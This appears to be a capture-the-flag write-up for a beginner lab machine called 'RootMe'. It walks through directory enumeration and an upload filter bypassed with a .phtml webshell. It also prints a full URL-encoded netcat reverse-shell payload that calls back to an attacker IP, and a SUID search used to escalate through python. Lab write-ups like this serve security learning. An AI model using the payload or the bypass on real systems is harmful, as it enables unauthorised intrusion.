RootMe

Target IP: 10.10.219.54

A ctf for beginners, can you root me?

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. The source-code of this page does not reveal anything.


Doing a directory search shows the interesting entries above. From the nikto scan, I know there is a directory called /panel There is also another directory called /uploads.


The /panel webpage above is shown above. It looks like I can upload files.



I uploaded a test text file. I was able to access this file at /uploads directory. The application has a filtering in place, as it does not allow me to upload .php extension.


I created a simple PHP webshell with the extension type as .phtml.


After uploading the webshell, I accessed it by visiting http://10.10.219.54/uploads/shell.phtml. This PHP file was uploaded successfully. In the image above, I sent the commands id;whoami;ls and received the output above. I should be able to obtain a reverse shell connection using this webshell.

Exploitation


I started a listener on port 8443 and sent the URL-encoded payload rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff. Then I received a reverse shell connection with the session as www-data. Now I have a foothold on the target machine.

Privilege Escalation


Running find / -perm -u=s 2>/dev/null shows usr/bin/python has SUID bit set.


And gaining a root shell is simple. Now I have root access on the target machine.


The root.txt flag.
